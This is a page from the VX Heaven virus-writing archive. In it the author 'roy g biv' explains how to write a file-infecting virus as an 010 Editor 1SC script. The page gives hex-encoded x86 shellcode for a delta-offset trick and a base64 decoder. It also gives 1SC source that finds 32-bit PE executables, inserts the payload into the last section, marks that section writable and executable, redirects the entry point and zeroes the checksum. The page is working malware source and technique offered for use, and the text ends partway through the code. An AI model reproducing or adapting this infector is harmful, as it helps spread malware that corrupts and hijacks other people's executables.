<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> roy g biv '010 Editor Scripts' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="roy g biv"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, roy g biv,010 Editor Scripts, byte, binary, base, delta, offset, zeroes, code, language, decoder, script, store, string, file, bytes, editor"/>
<meta name="Description" content="Many people know about the 010 Editor. It is a great tool for examining file structure using templates. It supports a scripting language called 1SC. 010 Editor has a powerful scripting engine that allows many tasks to be automated, including infecting files. ;)"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0fe8e52014302ceababaeadd31a0e74381cbbea1-1498755409-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrg15.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>010 Editor Scripts</h1><p><a href="/lib/?lang=en&amp;author=roy%20g%20biv"> roy g biv</a><br/> <em><a href="/vx.php?fid=1943#f1943">Valhalla #1</a></em><br/> <em>July 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrg15.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg15">Back to index</a>] [<a href="/lib/vrg15.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">What is it?</a></li>
<li><a href="#c1">1SC language</a></li>
<li><a href="#c2">Limitations</a></li>
<li><a href="#c3">Delta offset</a></li>
<li><a href="#c4">Base64</a></li>
</ul>
<h2><a name="c0"></a>What is it?</h2>
<p>Many people know about the 010 Editor. It is a great tool for examining file structure using templates. It supports a scripting language called 1SC. 010 Editor has a powerful scripting engine that allows many tasks to be automated, including infecting files. ;)</p>
<h2><a name="c1"></a>1SC language</h2>
<p>It became obvious to me when I first saw 010 Editor script, that I could write a virus in it. When a file is opened, it can be written unless it has the read-only attribute set. This is by design, of course. So it became a matter of writing code to infect the files, but how can a script infect a binary file? The infection is really just making the binary file into a dropper of the script. There is nothing special here.</p>
<h2><a name="c2"></a>Limitations</h2>
<p>Of course there were some problems. The 1SC language does not support casting of variables, so you cannot build an integer from an array of chars. You have to work with the chars one by one. That was annoying but I did that. Next challenge was to insert binary code into a binary file. This requires a string of binary characters. The problem is that strings cannot contain any zeroes, otherwise the length is where the zero is. There are two solutions to this problem. One solution is to write the code with no zeroes, but this is really hard for large programs. Another solution is encode the string. We can use any character except zero in the string, so if we have an unused value then we can XOR all of the bytes with that value. But if we have no unused value then we have no luck there. We can encode the string in another way, such as convert to printable text with an IMUL decoder. This doubles the size of the string, so that's not good either. I made a base128 encoder that sets bit 7 in every byte, and decoder is only 26 bytes, but then every byte must be escaped which triples the size of the string. Finally, I chose a base64 encoder. The string is only 1/3 larger and decoder is only 64 bytes because uses no dictionary.</p>
<h2><a name="c3"></a>Delta offset</h2>
<p>The base64 decoder contains no zeroes and supports ASLR using a trick that I never saw before. It seems that everyone copies everyone else to get delta offset without any zeroes, like this:</p>
<pre class="source">
	eb03		;jmp	fwd
back:	5e		;pop	esi
	eb05		;jmp	ok
fwd:	e8f8ffffff	;call	back
ok:	&lt;continue>
</pre>
<p>10 bytes. How about we do it in 7?</p>
<pre class="source">
	e8ffffffff	;call	$-1 ;points to ff
	c0		;ffc0=inc eax
	5e		;pop	esi
</pre>
<h2><a name="c4"></a>Base64</h2>
<p>Here's the rest of the base64 decoder:</p>
<pre class="source">
	83C632	;add	esi, $+34h
	8BFE	;mov	edi, esi

b64decode	proc	near
	AD	;lods	dword ptr [esi]
	6A04	;push	4
	59	;pop	ecx

b64_inner	label	near
	C1C008	;rol	eax, 8
	3C30	;cmp	al, '0'
	7305	;jnb	b64_testchar
	2C43	;sub	al, -(('/' shl 2) + 1) and 0ffh
	C0E802	;shr    al, 2 ;'+' and '/' differ by only 1 bit

b64_testchar	label	near
	0404	;add	al, 4
	3C3F	;cmp	al, 3fh
	7608	;jbe	b64_store
	2C45	;sub	al, 45h
	3C19	;cmp	al, 19h
	7602	;jbe	b64_store
	2C06	;sub	al, 6

b64_store	label	near
	0FACC206;shrd	edx, eax, 6
	E2E0	;loop	b64_inner
	92	;xchg	edx, eax
	0FC8	;bswap	eax
	AB	;stos	dword ptr [edi]
	4F	;dec	edi
	803E	;cmp	byte ptr [esi], ...
	49485853;base64-encoded cmp byte and branch
</pre>
<p>Here is the 1SC code:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> a<span style="color: #339933;">=&lt;</span>codesize<span style="color: #339933;">&gt;,</span>c<span style="color: #339933;">=</span>FileSize<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>d<span style="color: #339933;">,</span>f<span style="color: #339933;">,</span>g<span style="color: #339933;">,</span>h<span style="color: #339933;">,</span>i<span style="color: #339933;">,</span>j<span style="color: #339933;">,</span>k<span style="color: #339933;">,</span>l<span style="color: #339933;">;</span><br/>
<span style="color: #993333;">char</span> b<span style="color: black;">&#91;</span>a<span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #ff0000;">&quot;&lt;decoder+base64&gt;&quot;</span><span style="color: #339933;">,</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">96</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
<span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>c<span style="color: #339933;">&gt;</span><span style="color: #0000dd;">64</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; d<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span><span style="color: #0000dd;">60</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* read lfanew */</span><br/>
&nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">96</span><span style="color: #339933;">&lt;</span>c<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* if read is within file */</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; e<span style="color: black;">&#91;</span><span style="color: #0000dd;">92</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* if read stops before this field<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;then we can detect the error<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><br/>
&nbsp; &nbsp; ReadBytes<span style="color: black;">&#40;</span>e<span style="color: #339933;">,</span>d<span style="color: #339933;">,</span><span style="color: #0000dd;">96</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; f<span style="color: #339933;">=</span>d<span style="color: #339933;">+</span>ReadShort<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">6</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #0000dd;">40</span><span style="color: #339933;">+</span>ReadShort<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">20</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* inside last section header if PE file */</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>f<span style="color: #339933;">+</span><span style="color: #0000dd;">8</span><span style="color: #339933;">&lt;</span>c<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* if read is within file */</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; g<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* SizeOfRawData */</span><br/>
&nbsp; &nbsp; &nbsp; h<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>f<span style="color: #339933;">+</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* PointerToRawData */</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>ReadShort<span style="color: black;">&#40;</span>GetReadOnly<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #208080;">0x5a4d</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* 'MZ'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;read from offset 1 if read-only<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;can't match in that case<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;</span>ReadInt<span style="color: black;">&#40;</span>d<span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #208080;">0x4550</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* PE */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">76</span><span style="color: #339933;">&amp;&amp;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">5</span><span style="color: black;">&#93;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* IMAGE_FILE_MACHINE_I386 */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">22</span><span style="color: black;">&#93;</span><span style="color: #339933;">&amp;</span><span style="color: #0000dd;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* IMAGE_FILE_EXECUTABLE_IMAGE */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">23</span><span style="color: black;">&#93;</span><span style="color: #339933;">&amp;</span><span style="color: #0000dd;">49</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* IMAGE_FILE_32BIT_MACHINE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;and not IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;!</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">93</span><span style="color: black;">&#93;</span><span style="color: #339933;">&amp;&amp;</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">92</span><span style="color: black;">&#93;</span><span style="color: #339933;">-</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">&lt;</span><span style="color: #0000dd;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* IMAGE_SUBSYSTEM_WINDOWS_GUI or IMAGE_SUBSYSTEM_WINDOWS_CUI */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;!</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">95</span><span style="color: black;">&#93;</span><span style="color: #339933;">&amp;</span><span style="color: #0000dd;">32</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* not IMAGE_DLLCHARACTERISTICS_WDM_DRIVER */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;!</span>ReadInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">152</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* no digital certificates */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;</span>g<span style="color: #339933;">+</span>h<span style="color: #339933;">==</span>c<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* no appended data */</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">60</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* FileAlignment */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; InsertBytes<span style="color: black;">&#40;</span>c<span style="color: #339933;">,</span>i<span style="color: #339933;">+</span>Random<span style="color: black;">&#40;</span><span style="color: #0000dd;">2048</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #0000dd;">4096</span><span style="color: #339933;">+</span>a<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; <span style="color: #808080; font-style: italic;">/* increase file size by random amount */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>f<span style="color: #339933;">,</span>i<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>g<span style="color: #339933;">+</span>a<span style="color: #339933;">+</span>i<span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;-</span>i<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* round up SizeOfRawData */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; j<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>f<span style="color: #339933;">-</span><span style="color: #0000dd;">8</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* VirtualSize */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; k<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>f<span style="color: #339933;">-</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* VirtualAddress */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>j<span style="color: #339933;">&lt;</span>i<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* if VirtualSize &lt; SizeOfRawData */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>f<span style="color: #339933;">-</span><span style="color: #0000dd;">8</span><span style="color: #339933;">,</span>i<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* set new VirtualSize */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">56</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* SectionAlignment */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">80</span><span style="color: #339933;">,</span>j<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>k<span style="color: #339933;">+</span>i<span style="color: #339933;">+</span>l<span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;-</span>l<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* round up SizeOfImage */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WriteByte<span style="color: black;">&#40;</span>f<span style="color: #339933;">+</span><span style="color: #0000dd;">27</span><span style="color: #339933;">,</span>ReadByte<span style="color: black;">&#40;</span>f<span style="color: #339933;">+</span><span style="color: #0000dd;">27</span><span style="color: black;">&#41;</span><span style="color: #339933;">|</span><span style="color: #0000dd;">160</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* mark section writable and executable */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; g<span style="color: #339933;">+=</span>k<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; l<span style="color: #339933;">=</span>ReadInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">160</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Base Relocation Table RVA if present */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#91;</span><span style="color: #0000dd;">22</span><span style="color: black;">&#93;</span><span style="color: #339933;">&amp;</span><span style="color: #0000dd;">1</span><span style="color: #339933;">==</span><span style="color: #0000dd;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* if not IMAGE_FILE_RELOCS_STRIPPED */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;&amp;</span>l<span style="color: #339933;">&gt;=</span>k<span style="color: #339933;">&amp;&amp;</span>l<span style="color: #339933;">&lt;</span>k<span style="color: #339933;">+</span>j<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* and Base Relocation Table is in last section */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">160</span><span style="color: #339933;">,</span>l<span style="color: #339933;">+</span>a<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* move Base Relocation Table down in file */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; c<span style="color: #339933;">=</span>l<span style="color: #339933;">+</span>h<span style="color: #339933;">-</span>k<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* calculate physical offset */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; g<span style="color: #339933;">=</span>l<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; InsertBytes<span style="color: black;">&#40;</span>c<span style="color: #339933;">,</span>a<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* make gap */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WriteBytes<span style="color: black;">&#40;</span>b<span style="color: #339933;">,</span>c<span style="color: #339933;">,</span>a<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* place code */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>c<span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>ReadInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">40</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* append OEP */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">40</span><span style="color: #339933;">,</span>g<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* set new AddressOfEntryPoint */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WriteInt<span style="color: black;">&#40;</span>d<span style="color: #339933;">+</span><span style="color: #0000dd;">88</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* zero CheckSum */</span><br/>
